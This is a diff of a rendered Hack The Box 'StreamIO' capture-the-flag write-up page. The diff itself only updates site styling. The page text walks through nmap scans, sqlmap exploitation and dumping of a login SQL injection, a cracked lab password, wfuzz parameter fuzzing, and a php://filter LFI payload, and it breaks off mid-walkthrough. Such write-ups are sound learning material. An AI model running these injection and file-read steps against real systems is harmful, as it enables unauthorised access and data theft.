@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.769393205067">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.819170984352">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.5.0">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>StreamIO</title>
@@ -30,52 +30,52 @@
     <meta property="twitter:description" content="Nmap all ports:">
     <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/streamio/images/image01.png">
 
-    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.5.0.769393205067" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.819170984352" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.5.0.769393205067" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.819170984352" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
-                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
-                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">Caue</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">ctf-notes</span>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
-                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                            <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                         </g>
                                     </svg>
                                     <span>GitHub</span>
                                 </a>
                             </li>
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
                                             <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -96,7 +96,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -114,7 +114,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -124,26 +124,26 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
-                <!-- Render this div, if config.showSidebarFilter is `true` -->
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
-                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
-                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                         <span class="text-xs whitespace-nowrap">Powered by</span>
                         <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                     </a>
@@ -153,23 +153,23 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
-                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                                 </g>
                                             </svg>
                                             <span>GitHub</span>
                                         </a>
                                     </li>
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
                                                     <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -183,7 +183,7 @@
                             </nav>
                         </div>
             
-                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                             <span class="text-xs whitespace-nowrap">Powered by</span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                         </a>
@@ -191,14 +191,14 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
+                                <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
 <doc-anchor-target id="streamio" class="break-words">
     <h1>
@@ -220,7 +220,7 @@
 </doc-anchor-target>
 <p>Nmap all ports:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.129.186.63 
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.129.186.63 
 
 Nmap scan report for 10.129.186.63
 Host is up (0.27s latency).
@@ -249,7 +249,7 @@ PORT      STATE SERVICE
 </doc-codeblock></div>
 <p>Nmap safe scripts on open ports:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p 53,80,88,135,443,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49697,52483 10.129.186.63 -o nmap.txt
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p 53,80,88,135,443,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49697,52483 10.129.186.63 -o nmap.txt
 
 Nmap scan report for 10.129.186.63
 Host is up (0.33s latency).
@@ -306,7 +306,7 @@ Host script results:
 </ul>
 <p>We can add those to our <code v-pre>/etc/hosts</code> file:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">...[SNIP]...
+<pre translate="no" class="language-none"><code v-pre class="language-none">...[SNIP]...
 
 10.129.186.63   streamIO.htb watch.streamIO.htb
 
@@ -320,19 +320,19 @@ Host script results:
 </doc-anchor-target>
 <p>Browsing to <a href="https://streamio.htb">https://streamio.htb</a> the page loads an Online Movie Streaming service. There is a login page where it asks for username and password at <a href="https://streamio.htb/login.php">https://streamio.htb/login.php</a>.
 <figure class="content-center">
-    <img src="images/image01.png" alt="">
+    <img src="images/image01.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>We can use Burp to intercept a login attempt and save it to a file where we will use sqlmap to check for sql injections:
 <figure class="content-center">
-    <img src="images/image02.png" alt="">
+    <img src="images/image02.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>SQL injection found in <code v-pre>username</code> parameter:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sqlmap -r login.req --batch --force-ssl
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sqlmap -r login.req --batch --force-ssl
 
 ...[SNIP]...
 POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N                                                        
@@ -347,7 +347,7 @@ Parameter: username (POST)
 <p>Since the sql injection is time-based it is taking a very long time to retrieve data.</p>
 <p>Dumping the databases:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sqlmap -r login.req --batch --force-ssl --dbs
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sqlmap -r login.req --batch --force-ssl --dbs
 
 available databases [5]:
 [*] model
@@ -359,7 +359,7 @@ available databases [5]:
 <p>At this point we can start guessing some of the table names to make it quicker. For example, we can guess that there is a table called &quot;users&quot; in the STREAMIO database, as the name indicates it is the web app with the login page.</p>
 <p>Dumping the table <code v-pre>users</code> from STREAMIO db we see that there is 33 users, it will take forever to finish. Anyway, here is the syntax:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sqlmap -r login.req --batch --force-ssl -D STREAMIO -T users --dump
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sqlmap -r login.req --batch --force-ssl -D STREAMIO -T users --dump
 
 ...[SNIP]...
 
@@ -370,13 +370,13 @@ available databases [5]:
 </doc-codeblock></div>
 <p>We get a lot of users and password hashes. Trying to crack them with <a href="https://crackstation.net/">Crackstation</a> we end up with:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">username = yoshihide
+<pre translate="no" class="language-none"><code v-pre class="language-none">username = yoshihide
 password = '66boysandgirls..'</code></pre>
 </doc-codeblock></div>
 <p>We can use this credentials to login to <a href="https://streamio.htb/login.php">https://streamio.htb/login.php</a>.
 Logged in as <code v-pre>yoshihide</code> not much changed in the website, running gobuster we find the <code v-pre>/admin</code> endpoint.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ gobuster dir -u https://streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -k
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ gobuster dir -u https://streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -k
 
 ...[SNIP]...
 
@@ -391,7 +391,7 @@ Logged in as <code v-pre>yoshihide</code> not much changed in the website, runni
     </h3>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="images/image03.png" alt="">
+    <img src="images/image03.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -404,7 +404,7 @@ Logged in as <code v-pre>yoshihide</code> not much changed in the website, runni
 </ul>
 <p>We can fuzz it to see if we can find some more. Using wfuzz we specify the <code v-pre>--hw 131</code> to hide all responses with 131 words, <code v-pre>-b PHPSESSID</code> to specify the admin cookie and <code v-pre>-w</code> the wordlist used.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ wfuzz --hw 131 -b PHPSESSID=luoqop4jub9vubjbl5ngnblrb1 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt 'https://streamio.htb/admin/?FUZZ='
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ wfuzz --hw 131 -b PHPSESSID=luoqop4jub9vubjbl5ngnblrb1 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt 'https://streamio.htb/admin/?FUZZ='
 
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -424,14 +424,14 @@ ID           Response   Lines    Word       Chars       Payload
 </doc-codeblock></div>
 <p>After some testing, we find the <code v-pre>debug</code> parameter is vulnerable to LFI:
 <figure class="content-center">
-    <img src="images/image04.png" alt="">
+    <img src="images/image04.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Using the PHP filter trick we can extract some of the web pages source code. The important parts here are in the source code of:
 <a href="https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php">https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php</a></p>
 <div class="codeblock-wrapper"><doc-codeblock>
